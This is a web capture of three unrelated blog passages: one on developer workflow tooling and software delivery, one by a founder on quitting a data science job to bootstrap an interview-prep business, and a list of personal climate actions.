    <p><strong>Joining a project.</strong> By this I mean any time someone needs to set up a development environment to run and edit a given project. That includes me starting a new project in some language/framework; a new person I've invited to join my existing project; me editing my existing project on a new computer; or me returning to one of my old projects that I haven't worked on in months or years.</p>

    <p>As software development stacks have grown in complexity, so has the difficulty of onboarding new people to a project. Companies with big codebases have entire teams dedicated to building out the onboarding experience. It may take <a href="https://www.quora.com/What%E2%80%99s-the-new-employee-onboarding-at-Facebook-like">days or weeks of effort</a> to get a new developer up and running.</p>

    <p>Even a smaller codebase may require lots of trial-and-error: Xcode projects that require <a href="https://medium.com/codespace69/ios-xcode-code-signing-error-code-signing-is-required-for-product-type-application-in-sdk-216c1b16311e">confusing developer account key setup</a> or front-end web projects with a <a href="https://medium.com/@housecor/browserify-vs-webpack-b3d7ca08a0a9">maze-like stack of build tools</a>. Setup instructions documented in a README are almost always out of date.</p>

    <p>A leap forward in the last decade was the widespread adoption of <a href="https://12factor.net/config">dependency management</a> such as <a href="https://www.npmjs.com/">NPM</a>, <a href="https://crates.io/">Crate</a>, and <a href="https://bundler.io/">Bundler</a>. Dependency managers try to install everything you need to run the project. And importantly, they give a clear error when the project will not be runnable—for example, if you have the wrong version of the language runtime.</p>

    <p>Another technique is wrapping up projects into container images with tools like <a href="https://www.vagrantup.com/">Vagrant</a> or <a href="https://www.smashingmagazine.com/2016/04/stop-installing-your-webdev-environment-locally-with-docker/">Docker</a>. This is the right spirit, but its use is a bit heavyweight, so most projects don’t bother.</p>

    <p>The future solution I’d like to see is a one-click, can’t-fail project installation. I want joining a new project to be as easy as clicking a link to a Google Doc where I can immediately start making edits. That probably requires a toolchain that is fully self-describing—like dependency managers, but extended to absolutely every aspect of setting up a project including <a href="https://12factor.net/config">environment configuration</a> and <a href="https://12factor.net/backing-services">external services</a>.</p>

    <p>One move in this direction is web-based all-in-one development environments such as <a href="https://glitch.com/">Glitch</a>, <a href="https://repl.it/">Repl.it</a>, and <a href="https://github.com/features/codespaces">Codespaces</a>. So far none of these have become widely popular with developers, who typically prefer local and modular toolchains.</p>

    <p><strong>Seeing changes.</strong> Once upon a time, developers had an extensive <a href="https://xkcd.com/303/">compile-run cycle</a> that could take minutes or longer. When I worked in the game industry doing Dreamcast and Playstation 2 game development, I had as much as a fifteen-minute wait on my build cycle. I kept a book by my desk and got a lot of reading done in those days.</p>

    <p>PHP and other early web dev tools offered a save-reload loop that took just seconds—a revelation for me after years of game development. More recently, <a href="https://gohugo.io/commands/hugo_server/">live-reload dev servers</a> go a step better, removing the need to switch windows and press the reload button.</p>

    <p>iOS and Android default dev kits still have a somewhat long cycle to get the program built and running on-device. Some newer frameworks like <a href="https://flutter.dev/">Flutter</a> and <a href="https://developer.apple.com/xcode/swiftui/">SwiftUI</a> can hot-reload changes.</p>

    <p>All of this takes us gradually closer to the ideal state: perfect immediacy. I make a change, I see it; no waiting. We’re not there yet, but I hope we might achieve it in the coming decade.</p>

    <p><strong>Publishing to users.</strong> In ages past, we might share our software by <a href="https://arstechnica.com/staff/2018/11/first-encounter-compute-magazine-and-its-glorious-tedious-type-in-code/">putting the source code into a magazine</a> or selling it in a box in a software store. More recently, you might send someone the .EXE via email or let them download it from your website.</p>

    <p>Direct distribution of .EXEs was great in many ways, but opened the door for a profusion of malware turning computers into legions of <a href="https://en.wikipedia.org/wiki/Zombie_(computing)">zombie botnets</a>. The solution has been a combination of permissions/sandboxing and app stores.</p>

    <figure>
      <img src="https://adamwiggins.com/making-computers-better/boxed-software.jpg" alt="Turbo Pascal, software delivered in a box">

      <figcaption>

    </figure>

    <p>Curated app stores help with malware and discovery, which is a clear win. But the intermediation between a software creator and the user has many downsides. Permission to send bugfixes to your users, unknown review timelines, rejections for seemingly arbitrary reasons—it kills innovation, momentum, and simple joy of building and shipping good products to your users.</p>

    <p>The iOS App Store is infamous for its heavy developer account setup (<a href="https://developer.apple.com/support/D-U-N-S/">DUNS number</a>, anyone?) and an opaque review process. And lest you think Apple is alone here, just check out every other vendor’s app store: the <a href="https://developer.chrome.com/webstore/publish">Chrome Web Store</a>, <a href="https://docs.microsoft.com/en-us/windows/uwp/publish/the-app-certification-process">the Windows store</a>, Steam and all gaming consoles, Linux stores like <a href="https://snapcraft.io/">Ubuntu</a> and <a href="https://appcenter.elementary.io/">Elementary</a>, and many others—all with their own variations on submission guidelines, review hurdles, and app permissions and sandboxing.</p>

    <figure>
      <img src="https://adamwiggins.com/making-computers-better/testflight.png" alt="screenshot of TestFlight">

      <figcaption>
        <svg width="50" height="10" viewBox="0 0 50 10" fill="none" xmlns="http://www.w3.org/2000/svg">

        </svg>

        <p><a href="https://developer.apple.com/testflight/">TestFlight</a> and <a href="https://appcenter.ms/">App Center</a> offer a somewhat faster path for delivering software while still within the app store model.</p>
      </figcaption>
    </figure>

    <p>I can send a tweet that's published to potentially millions of users in seconds. Why can't I do the same with publishing my software?</p>

    <p>Alongside this consolidation on the app store model, we have a quiet juggernaut: the web. The miracle of the web is that anyone can visit a website, download the software program described there, and execute it instantly and safely.</p>

    <p>Only the web was built from the ground-up with fine-grained permissions and a language runtime with near-perfect <a href="https://users.soe.ucsc.edu/%7Eabadi/CS223_F12/taly.pdf">sandboxing</a>. There's a lot that native apps can do that the web can't, like high performance and tight hardware integration (and I don’t think the web will ever catch up). But even so, the simple power of the web-based delivery mechanism is so good that I expect it to continue to dominate software creation and delivery for the foreseeable future.</p>

    <figure>
      <img src="https://adamwiggins.com/making-computers-better/heroku.png" alt="original Heroku logo">

      <figcaption>
        <svg width="50" height="10" viewBox="0 0 50 10" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="50" height="10" rx="2.5" fill="#298070"></rect>
        </svg>

        <p>Proud of this one. :-)</p>
      </figcaption>
    </figure>

    <p>One swing I took at this problem space is <a href="https://www.heroku.com/">Heroku</a>. As great as the web is at delivering software from a server, you still need to do a bunch of time-consuming and error-prone installation and configuration ceremonies to set up and deploy to that server. Heroku takes that all away: with a single command you go from code on your computer to working software in the hands of your users. <a href="https://www.netlify.com/">Netlify</a>, <a href="https://vercel.com/">Vercel</a>, <a href="https://www.digitalocean.com/docs/app-platform/">Digital Ocean’s App Platform</a>, and others have continued this instant-deployment pattern, and as a software developer I can't imagine working any other way now.</p>

    

    <p>Putting together these three workflow improvements (fast ways to join a project, see changes, and publish) and you get the the <a href="https://2018.splashcon.org/track/live-2018-papers">live coding</a> experience seen in <a href="https://2018.splashcon.org/track/live-2018-papers">Codepen</a>, <a href="https://jsfiddle.net/">JS Fiddle</a>, and <a href="https://observablehq.com/">Observable</a>. This is not quite <a href="https://www.nngroup.com/articles/direct-manipulation/">direct manipulation</a> for software creation, but it's a close as we've gotten so far, and I hope dev tool creators keep pushing it further.</p>

    <p>And one more thing. If we can somehow reach a state where joining, seeing changes, and publishing are effortless and instantaneous, that opens up the final frontier: <a href="https://www.inkandswitch.com/end-user-programming.html">end-user programming</a>.</p>
    <p>End-user programming blurs all the lines: developer and user can easily be the same person; software creation can be a more collaborative and inclusive experience rather than siloed to professional software engineers; and every person in our society gets to experience (if even briefly) the satisfaction, empowerment, and analytical mindset that we programmers enjoy in our daily work.</p>

    <p><strong>The world we have:</strong> Programming tools are good, although still out of reach for most people. Project setup and seeing results of changes are slow and clunky. Software delivery is increasingly intermediated by app stores.</p>

    <p><strong>The world I want:</strong> Creating software feels like direct manipulation—as fast and fun as using a smartphone. Delivering software to users is instantaneous, like sending a tweet.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>Over one year ago, I decided to quit my data science job and pursue my <a href="https://www.interviewquery.com/">bootstrapped data science side-project</a> full time. It was a hard decision to make, but once I quit and was freed from the corporate nine to five, my life turned to complete bliss.</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>That bliss lasted about two weeks before it reverted back to the mean. Honeymoons exist in all facets of life, and bootstrapping a business does not make you impervious to Mondays. Rather every day just became a Thursday. But more on that later...</p><p>I wanted to reflect on this past year plus of bootstrapping and add in some frameworks for why anyone reading this on the fence of quitting their job for their side-hustle should do so. Quitting was one of the hardest decisions that I had to make, but the best one I went through with. It's also a decision that many people should not do. </p><p>But for the small percentage of the people out there, bootstrapping a startup can be an awesome thing. You resign yourself to make trades. </p><p>You trade a steady stream of work and meetings for flexibility in your own time and hours. You trade your current monthly salary now for no income but with future options of money. And you trade office externalities and politics for taking full control of how your career might turn out. </p><p>And ultimately if those trades and values are worth it, then quitting your job can make sense in a very real way. </p><h2 id="how-it-got-started">How it got started</h2><p>On November 1st 2019, I officially quit my job as a data scientist at Nextdoor after working there for exactly a year. I had started a side project called Interview Query with my co-founder, Shane, six months prior. </p><p>Interview Query started out as an email newsletter that each day sent a user a data science interview question, and then the solution the next day if the user upgraded to premium. Over the past year we’ve built the product into a fully-fledged data science course, questions database, and became the de-facto data science interview prep resource.<br></p><figure><img src="https://blog.interviewquery.com/content/images/2021/01/image-18.png" alt="Interview Query SQL" srcset="https://blog.interviewquery.com/content/images/size/w600/2021/01/image-18.png 600w, https://blog.interviewquery.com/content/images/size/w1000/2021/01/image-18.png 1000w, https://blog.interviewquery.com/content/images/2021/01/image-18.png 1364w" sizes="(min-width: 720px) 720px"><figcaption>An example of a SQL interview question we would send out. If you paid for premium, we would send a detailed explanation + solution the next day.&nbsp;</figcaption></figure><p>The first time someone purchased a subscription in June of 2019, my co-founder Shane was convinced it was a stolen credit card. It took five more customers before he truly believed that we were not just a test platform for fraudsters. And we watched in fascination as our newsletter grew from $60/mo in revenue to $3,000/mo in revenue. <br></p><figure><img src="https://blog.interviewquery.com/content/images/2021/01/image-19.png" alt="" srcset="https://blog.interviewquery.com/content/images/size/w600/2021/01/image-19.png 600w, https://blog.interviewquery.com/content/images/size/w1000/2021/01/image-19.png 1000w, https://blog.interviewquery.com/content/images/2021/01/image-19.png 1258w" sizes="(min-width: 720px) 720px"></figure><p>And while $3K/mo was a lot of money, it still wasn’t enough to constitute quitting our jobs. Shane was working part-time on it while also working a software engineering job. And I was also a pretty senior data scientist making <a href="https://www.interviewquery.com/blog-data-science-salaries">$160K/year</a>. So an apples to apples comparison of going from to $14K/month to $1.5K/month didn’t really seem worth it. </p><p>But direct income &nbsp;isn’t the only comparison you have to make. </p><h2 id="opportunity-cost">Opportunity Cost</h2><p>The hardest jump to make is almost always on money. Money has always had significance to me. I was born and raised as a Chinese American which meant money was and still is an intrinsic part of my identity. The comedian <a href="https://www.youtube.com/watch?v=O_KpLrHCAx0">Ronnie Chieng does a funny bit</a> on what money means to Chinese people.</p><blockquote>“Do you know what the direct translation of <em>Happy New Year</em> in Mandarin is? Hope - you - get - rich. <strong>That's not Happy New Year!</strong>"</blockquote><p>To my Chinese parents, they could have added an addendum of - <em>Hope you get rich while working a stable job with low risk.</em> For with all monetary pursuits, the equation that works best within typical Chinese American families is:</p><p><em>Current income * very stable job * years of working = <strong>Best Possible Outcome Ever</strong></em></p><p>It’s a pretty linear expectation of wealth that requires a normal day to day grind and the advantages of compound interest. But the equation never really took into account tweaking the risk factor. What happens when your current income drops and risk tolerance increases? </p><p>This was the pivotal question that made it difficult for me to quit. But a month before I ended up leaving, I met up with my old startup boss at a <a href="https://techcrunch.com/2016/06/08/monster-snaps-up-tinder-for-jobs-app-jobr/">company where we exited into an acquisition</a>. I told him about the dilemma I was in, and he illustrated a newer way of looking at it. </p><blockquote>If you have a product that’s making $3K/month and you can grow that into $5K/month in a few months by working full time on it, you have to realize that the <strong>actual added value of growing your business</strong> is turning it from $36K/year in revenue to $60K/year in revenue.<br></blockquote><p>This realization helped me understand the <strong>value investment of full-time work. </strong>Money and finances can be traded for time and investment in a business in ways that you can't when you work a job. Work your ass off for a year at any FAANG type of tech company and your boss will reward you with a 15% raise. Work hard on your business and double your monthly revenue after a year, <strong>well your business also just doubled in value. </strong></p><p>So the opportunity cost of trading a job that made me $160K/year didn’t seem that bad anymore if I could at least <strong>forecast a rate of growth that would be worth my time and investment</strong> as if I was working another full time job. </p><p>And at least on my own business, I’d enjoy the work. </p><h2 id="flexibility-and-values">Flexibility and Values</h2><p>Everything gets destroyed when you bulldoze a building. The walls, the appliances, even parts of the foundation. And while throwing a wrecking ball into the corporate 9-5 felt gratifying, picking up the pieces to rebuild <strong>exactly how I would work</strong> took just as much careful planning and thought. </p><p>Balancing structure and life is important when bootstrapping. A lifestyle business allows you flexibility in how you would like to run your business. Before I quit my job, I talked to a career coach (ironically employed by the company) who encouraged me to figure out my values - and try to see if quitting allowed me to prioritize them accordingly.</p><p>Eventually I realized it did when I wanted to re-prioritize my activity list from:</p><ol><li><em>Data science job</em></li><li><em>Surfing</em></li><li><em>Side-Hustle (Interview Query)</em></li><li><em>Friends and Relationships</em></li><li><em>Random data projects</em></li></ol><p>to</p><ol><li><em>Surfing</em></li><li><em>Interview Query</em></li><li><em>Friends and Relationships</em></li><li><em>Random data projects</em></li><li><em>Things I don’t want to do but have to do to make money</em></li></ol><p>This clear order of change in my lifestyle made me realize that valuing flexibility was extremely important. It was also something I couldn't attain in my day job.</p><p>For example, when an amazing swell approaches Ocean Beach now, I reschedule meetings, log off, and go surfing. Shane and I both have trust that I'm going to finish the work that needs to get done. But if I were to receive a meeting at my old job that conflicted or I didn't want to attend - there was no way around it. </p><p>As controllers of our own fate, we make it a priority to cut down all the things we don’t want to do, and hire for those roles. If we need vacation time, then we take it.</p><p>But on that note of flexibility comes the other way - how flexible can we be while still working? And how much did we really want to work in general?</p><h2 id="financial-independence-of-sorts">Financial Independence of Sorts</h2><p>In February of 2020, Interview Query was churning out a consistent $9K/month in revenue. We tripled revenue by increasing our distribution and had transitioned from the email newsletter to building a very simple interface for viewing all of the interview questions and solutions. It was also enough to now cover my rent and general expenses.</p><figure><img src="https://blog.interviewquery.com/content/images/2021/01/image-22.png" alt="" srcset="https://blog.interviewquery.com/content/images/size/w600/2021/01/image-22.png 600w, https://blog.interviewquery.com/content/images/size/w1000/2021/01/image-22.png 1000w, https://blog.interviewquery.com/content/images/size/w1600/2021/01/image-22.png 1600w, https://blog.interviewquery.com/content/images/size/w2400/2021/01/image-22.png 2400w" sizes="(min-width: 720px) 720px"><figcaption><a href="https://www.interviewquery.com/questions/bank-fraud-model">Our current interface - much improved from before</a></figcaption></figure><p>And better yet we still weren’t even working that much. I had taken a long vacation in New Zealand and Shane was still working part time. For a moment, it seemed like it was going to be a 4-hour work week kind of business that we could maintain without adding new product features. </p><p>But realistically, <strong>I had nothing else to work on</strong>. I still hadn’t gotten any of my other side-projects off the ground at the time. Surfing season was slowly ramping down. I looked around at what I was doing and realized that this project was the only one working and growing on its own. So why not invest to work on it?</p><p>One of my favorite ice breakers is asking people what they would do with their life if they received $10,000/month forever. Kind of like a basic<strong> </strong>(wealthy) income. Many people say travel (<em>which seems illogical given the extent of traveling for the rest of your life</em>), others say they’d make music, volunteer full time, work on making furniture, even working at a boba shop.</p><figure><img src="https://blog.interviewquery.com/content/images/2021/01/image-20.png" alt="" srcset="https://blog.interviewquery.com/content/images/size/w600/2021/01/image-20.png 600w, https://blog.interviewquery.com/content/images/2021/01/image-20.png 800w" sizes="(min-width: 720px) 720px"><figcaption>Our New Zealand van!</figcaption></figure><p>It’s a thought experiment on the idea of financial independence (FIRE). And at its core, the question is asking about what you would practically do for the rest of your life if money wasn’t an issue. The current existence of career advancement is fueled by a never-ending competition in monetary and title status. But if those were all stripped away, what would be left to complete life satisfaction?</p><p>I realized there was nothing else I wanted to do but build a startup anyway. Of course money will always matter and I inherently want to grow the business bigger and bigger. But what happens when it’s just a question of: <em>what do I do with my time when my expenses are accounted for and I want to be productive?</em></p><p>Many people in the FIRE community seem to be at loss when they finally achieve their financial freedom. They grind at a job for 15 years to finally quit and reach the same elation that I felt for maybe a few weeks or even months to suddenly fall back into a depression of sorts. Their life has no purpose after hitting their number. Which makes sense, because for 15 years <strong>all they knew about was the grind</strong> and <strong>all they thought about was hitting their number</strong>.</p><p>I personally love startups and businesses. Building and running companies requires the experience and skillset to get better at doing so. And so the question posed that helped me understand things was: </p><p><em>Would you rather be completely financially independent at age X and then quit your job to try a startup, or get good at building startups now and be a complete pro at age X instead?</em></p><h2 id="buy-futures-in-yourself">Buy Futures in Yourself</h2><p>The first few weeks after quitting my job I enjoyed the classic freedom and flexibility I had …</p></div></section></div>

I'm addicted to meaningful online communities, as you can tell.<br>‍<br>‍</li><li><strong>Plan your meals every week<p>‍</p></strong>Solving food waste/loss is arguably the <a href="https://www.drawdown.org/solutions/table-of-solutions">most impactful climate solution</a>. It's also something we have a lot of control over! If you're optimizing for convenience, <a href="http://bit.ly/zerowastemealplans">Ends+Stems</a> can help you out.<br>‍<br>‍</li><li><strong>Stop wasting food<p>‍</p></strong>Seriously. Start noticing what you throw out. I used to think I was pretty good about not wasting food, but then I started realizing that I never ate my bread butts. I never finished the whole bag of arugula. And I'd forget about my milk!<p>We have some tips on food waste including a calendar reminder to organize your fridge every two weeks <a href="https://www.soapboxproject.org/archive/food-waste-affected-by-coronavirus-covid-pandemic" target="_blank">here</a>. We usually eat what we see, so my first step is keeping all my groceries visible.</p><p>‍</p></li><li><strong>Compost<p>‍</p></strong>I love composting because I feel like I'm connected to the solution — I can see how many veggie peels go in the compost instead of ending up in landfill.<p>If you live in an urban city with a composting service, USE IT! All you need is a <a href="https://www.bamboozlehome.com/products/composter" target="_blank">little compost bin</a> to get started, and if you get one with a charcoal filter, it won't stink up your place. (I just moved cities so I actually don't even have a little compost bin — I just grab handfuls of produce and throw them in my municipal bin. Wouldn't really recommend that, though.)</p><p>You can also start a <a href="https://learn.eartheasy.com/guides/composting/" target="_blank">backyard compost</a> if that's an option.</p><p>Finally, if your city doesn't have a municipal composting program, contact an official to see if you can get one started — that can be one of the highest-impact changes you make!<strong><p>‍</p></strong></p></li><li><strong>Join your local Buy Nothing group</strong> <p>I can't believe I didn't know about this till 2020, but the <a href="http://buynothingproject.com/" target="_blank">Buy Nothing</a> project is AMAZING! It's a hyperlocal network of neighbors giving stuff they no longer need. I've taken &lt;15 minute walks around my neighborhood and picked up chairs, coffee tables, a nice bookshelf, a desk, kitchenware and more for free! Fighting climate anxiety, for me, has to include fun and joy. That's what Buy Nothing has given me.</p><p>You could also try <a href="https://www.freecycle.org/" target="_blank">FreeCycle</a>, Craigslist, FB marketplace, <a href="https://offerup.com/" target="_blank">OfferUp</a>, and more to get secondhand stuff for cheap/free.</p><p>‍</p></li><li><strong>Support your local Tool Library or get one started near you<p>‍</p></strong>I actually didn't know about tool libraries until 2021, but many cities have neighborhood hubs where you can borrow tools like pressure washers and more! I found out that there's one only a few blocks from me supported entirely through donations and city grants.<p>There's a lot of documentation on <a href="https://myturn.com/resource/starting-a-tool-library/" target="_blank">how to start one</a> and I think it's a wonderful way to reduce waste while participating in your community.</p><p>‍</p></li><li><strong>Buy a reusable water bottle<p>‍</p></strong>If you have climate anxiety, you probably do this already, but I know so many folks in my own life that care deeply about the environment while their families binge single-use water bottle Costco packs.<p>If that's you and your fam, buy them a reusable water bottle as a gift. People don't always like talking about climate change, but they love getting gifts!</p><p>‍</p></li><li><strong>Cut out single-use plastic as much as you can<p>‍</p></strong>Identify the #1 thing you use single-use plastic for. Mine was saran wrap. Now, eliminate or substitute it. I started using Tupperware and realized I barely needed food wrap for anything!<p>If you need more ideas on cutting out plastic, here's a list of <a href="https://www.soapboxproject.org/archive/18-facts-about-plastic-pollution" target="_blank">18 facts and tips.<p>‍</p></a></p></li><li><strong>Electrify your hometown<p>‍</p></strong>According to Rewiring America, ~40% of our greenhouse gas emissions come from what's in our homes and garages. Right now, it can be costly and tedious, but it doesn't have to be! All you have to do right now is share a story or take a survey about your efforts to go green, and they'll help you from there. <a href="https://www.rewiringamerica.org/electrify-your-hometown" target="_blank">Check it out</a>.<br>‍</li><li><strong>Participate in local government<p>‍</p></strong>Global problems like climate change often require local solutions. Things like plastic bag bans, electrification, water management, and more happen on a local level. Check if your city has a sustainability committee and show up to meetings. If not, show up to general city council meetings — even once a month is great!<p>This is one of the MOST high-leverage ways you can make a difference since you'll affect so many folks outside your household. The first step for me was following my city officials on Twitter, and now I know which meetings I need to show up to so I can make my voice heard.</p><p>‍</p></li><li><strong>Book ProPublica's tracker on environmental bills<p>‍</p></strong>You can use <a href="https://projects.propublica.org/represent/bills/category/environmental-protection" target="_blank">ProPublica's tracker</a> to see environmental legislation relevant to your area. I check it monthly to see if there's anything I should know about/contact my rep about.<p>‍</p></li><li><strong>Divest from Big Oil<p>‍</p></strong>If you invest in the stock market, go through your portfolio and pull out money from big banks and oil companies.<p>‍</p></li><li><strong>Invest sustainably with Carbon Collective<p>‍</p></strong>Navigating the stock market can be difficult especially if, like me, you rely on robo-advisors that care about portfolio growth and not the planet. Thankfully, <a href="http://carboncollective.co/" target="_blank">Carbon Collective</a> does both! Their investment calculator shows that they can outperform traditional funds while putting your money into stuff that makes the earth happy. I really like their transparency - you can see their portfolio and methodology on their website and decide for yourself.<p>I also interviewed their co-founder, Zach Stein, because I had a <a href="https://www.soapboxproject.org/journal/what-is-sustainable-investing-and-is-it-profitable" target="_blank">bunch of questions</a> for them — if you're not sure how you feel about new investment tools, check out our interview. Like me, you'll probably be convinced to make the switch.</p><p>‍</p></li><li><strong>Switch your bank with Mighty Deposits<br>‍<br>‍</strong>I personally still rely on Chase for my credit card, but I'm optimistic every day that there'll be a better alternative. I have my bank accounts in non-corporate institutions, though, and I used <a href="https://mightydeposits.com/" target="_blank">Mighty</a> to find a bank that aligned with my values. I settled on NCB Coop because it had a 1% APY, which made me MORE money than I was making with my existing savings plan <em>and</em> it invests funds into community housing. It's a win-win!<p>The whole thing took ~10 min from research to setting up an account.</p><p>‍</p></li><li><strong>Help out with Corporate Social Responsibility (CSR) at your company<p>‍</p></strong>Does your company have a social responsibility program? Ask how you can get involved or start an initiative yourself. Here's what you could copy + paste in an email: "Hi, my name is X and I'm interested in making [our company] more sustainable. Do we have any sustainability targets for the next few years? I'd love to learn how I can get involved!"<p>‍</p></li><li><strong>Hold your company accountable<p>‍</p></strong>Companies often make sweeping claims for PR that they hope won't get fact checked (see Emily Atkin's <a href="https://heated.world/p/ten-billion-schmen-schmillion" target="_blank">thoughts</a> on Jeff Bezos's $10M climate pledge that later came true). If your company promised change, follow up.<p>Email your head of HR with something like this after introducing yourself: "In [X month], our company committed [$Y] to combatting [issue]. I was proud of our pledge for a better world and I wanted to follow up to see what steps we've taken and how I can help out. Can I get an update on our progress and what still needs to get done?"</p><p>If you work for a large corporation, it's also worth digging into your PAC (political action committees). My old company had one and I had no idea it funneled money into backing Ted Cruz and other anti-climate legislators! I followed up and learned these contributions were individually funded, not funded through employee revenue, but it made me realize I could have asked about how to do something similar for candidates I cared about. Especially since our company had ~500,000 employees I could lean on!</p><p>‍</p></li><li><strong>Use gifting as a way to heal the climate<p>‍</p></strong>For family and friends who care less about climate change than I do, I've been sneakily buying them stuff that makes their lives easier, keeping my mouth shut about sustainability and talking instead about aesthetics or cost. I'll throw in sustainability as a perk at the end, and I've found it's a good way to start off on common ground.<p>Some ideas are <a href="https://www.bamboozlehome.com/products/composter" target="_blank">cute compost bins</a>, <a href="https://bluewombatbondi.com/" target="_blank">bamboo utensils</a>, <a href="https://simplystraws.com/" target="_blank">reusable straws</a>, and food storage containers. We also have a list of 50 eco-friendly gifts <a href="https://www.soapboxproject.org/journal/the-50-best-eco-friendly-gifts-for-sustainable-holidays-2020" target="_blank">here</a>. If you're leaning towards something more gift-y than kitchen stuff, you can check out the <a href="https://www.facebook.com/groups/GlobeInMaven/" target="_blank">GlobeIn Mavens Community</a> where people swap second-hand artisan items that are ethically made.</p><p>‍</p></li><li><strong>Bike more<p>‍</p></strong>And fight for bicycle infrastructure in your city. Biking was SUCH a good way to cope with COVID while getting exercise and not driving. If you …</li></div></div>
